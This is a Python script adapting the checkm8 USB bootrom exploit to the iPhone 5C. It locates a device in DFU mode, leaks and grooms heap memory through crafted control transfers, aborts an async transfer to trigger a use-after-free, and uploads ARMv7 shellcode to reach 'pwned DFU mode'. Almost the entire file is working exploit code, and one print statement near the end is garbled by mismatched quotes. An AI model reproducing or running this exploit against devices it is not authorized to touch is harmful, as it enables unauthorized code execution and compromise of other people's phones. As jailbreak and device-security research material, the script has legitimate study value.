import sys, time, array, ctypes, struct
import usb

request           = None
transfer_ptr      = None
never_free_device = None

PAYLOAD_OFFSET_ARMV7 = 384
PAYLOAD_SIZE_ARMV7   = 320

def print_page():
  print("Usage: ipwndfu[options]")
  print("Interact with an iOS device in DFU  Mode. \n")
  print("Options: ")
  print(" -p USB exploit")
  print("----------------------")
  print(" -f Send File (not yet)")

class DeviceConfig:
  def __init__(self, version, cpid, large_leak, overwrite, hole, leak):
    assert len(overwrite) <= 0x800
    self.version    = version
    self.cpid       = cpid
    self.large_leak = large_leak
    self.overwrite  = overwrite
    self.hole       = hole
    self.leak       = leak

def libusb1_create_ctrl_transfer(device, request, timeout):
  ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
  assert ptr is not None

  transfer = ptr.contents
  transfer.dev_handle = device._ctx.handle.handle
  transfer.endpoint = 0 # EP0
  transfer.type = 0 # LIBUSB_TRANSFER_TYPE_CONTROL
  transfer.timeout = timeout
  transfer.buffer = request.buffer_info()[0] # C-pointer to request buffer
  transfer.length = len(request)
  transfer.user_data = None
  transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0) # NULL
  transfer.flags = 1 << 1 # LIBUSB_TRANSFER_FREE_BUFFER

  return ptr

def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
  if usb.backend.libusb1._lib is not device._ctx.backend.lib:
    print("ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.")
    sys.exit(1)

  global request, transfer_ptr, never_free_device
  request_timeout = int(timeout) if timeout >= 1 else 0
  start = time.time()
  never_free_device = device
  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
  transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
  assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

  while time.time() - start < timeout / 1000.0:
    pass

  # Prototype of libusb_cancel_transfer is missing from pyusb
  usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
  assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0

def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout):
  try:
    device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
  except usb.core.USBError:
    pass

def asm_thumb_trampoline(src, dest):
  assert src % 2 == 1 and dest % 2 == 1
  if src % 4 == 1:
    return struct.pack('<2I', 0xF000F8DF, dest)
  else:
    return struct.pack('<2I', 0xF002F8DF, dest)

def prepare_shellcode(name, constants = []):
	fmt  = '<%sI'
	size = 4
	
	with open('bin/%s.bin' % name, 'rb') as f:
		shellcode = f.read()
		
	# Shellcode has placeholder values for constants; check they match and replace with constants from config
	placeholders_offset = len(shellcode) - size * len(constants)
	for i in range(len(constants)):
		offset = placeholders_offset + size*i
		(value,) = struct.unpack(fmt % '1', shellcode[offset:offset + size])
		assert value == 0xBAD00001 + i
	
	return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)

def usb_req_stall(device):   libusb1_no_error_ctrl_transfer(device,  0x2, 3,   0x0,  0x80,  0x0, 10)
def usb_req_leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
def usb_req_no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)

def payload():
  constants_usb_s5l8950x = [
    0x10000000, # 1 - LOAD_ADDRESS
    0x65786563, # 2 - EXEC_MAGIC
    0x646F6E65, # 3 - DONE_MAGIC
    0x6D656D63, # 4 - MEMC_MAGIC
    0x6D656D73, # 5 - MEMS_MAGIC
    0x7620+1  # 6 - USB_CORE_DO_IO
    ]
	
  constants_checkm8_s5l8950x = [
          0x10061988, # 1 - gUSBDescriptors
          0x10061F80, # 2 - gUSBSerialNumber
            0x7C54+1, # 3 - usb_create_string_descriptor
          0x100600D8, # 4 - gUSBSRNMStringDescriptor
          0x10079800, # 5 - PAYLOAD_DEST
PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
  PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
          0x10061A24  # 8 - PAYLOAD_PTR
  ]
	
  s518950x_handler	= asm_thumb_trampoline(constants_checkm8_s5l8950x[6]+1, 0x8160+1) + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8950x)[8:]
  s518950x_shellcode      = prepare_shellcode("checkm8_armv7", constants_checkm8_s5l8950x)
  assert len(s518950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
  assert len(s518950x_handler)   <= PAYLOAD_SIZE_ARMV7
  
  return s518950x_shellcode + ('\0' * (PAYLOAD_OFFSET_ARMV7 - len(s518950x_shellcode))).encode("utf-8") + s518950x_handler

def exploit_config():
  s51895xx_overwrite = ('\0' * 0x640).encode("utf-8") + struct.pack("<20xI4x", 0x10000000)
  config = DeviceConfig("iBoot-1145" , 0x8950, 659, s51895xx_overwrite, None, None)
  return payload(), config


def acquire_device(timeout=5.0, match = None):
    start = time.time()
    while time.time() - start < timeout:
        for device in usb.core.find(find_all = True, idVendor = 0x5AC, idProduct = 0x1227):
            if match is not None and match not in device.serial_number:
                continue
            return device
        time.sleep(.001)
    print("ERROR: No apple device in DFU Mode 0x1227 detected. Exiting.")
    sys.exit(1)
    return None

def release_device(device):
    usb.util.dispose_resources(device)

def usb_reset(device):
    try:
        device.reset()
    except usb.core.USBError:
        pass

def exploit():
  print(" CheckM8 Exploit by axi0mX, edited by Joshua Deykin to work specially with the iPhone 5C")

  device = acquire_device()
  start = time.time()
  print("Found: ", device.serial_number)
  if 'PWND:[' in device.serial_number:
    print("Device is already in pwned DFU Mode. Not executing exploit.")
    return
  payload, config = exploit_config()

  usb_req_stall(device)
  for i in range(config.large_leak):
    usb_req_leak(device)
  usb_req_no_leak(device)
  
  usb_reset(device)
  release_device(device)

  device = acquire_device()
  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
  release_device(device)

  time.sleep(0.5)

  device = acquire_device()
  usb_req_stall(device)
  usb_req_leak(device)
  
  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
  for i in range(0, len(payload), 0x800):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
	
  usb_reset(device)
  release_device(device)

  device = acquire_device()
  if 'PWND:[checkm8]' not in device.serial_number:
    print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
    sys.exit(1)
  print("Device is now in pwned DFU Mode.")
  print("(%0.2f seconds)' % (time.time() - start)")
  release_device(device)

print_page()
exploit()
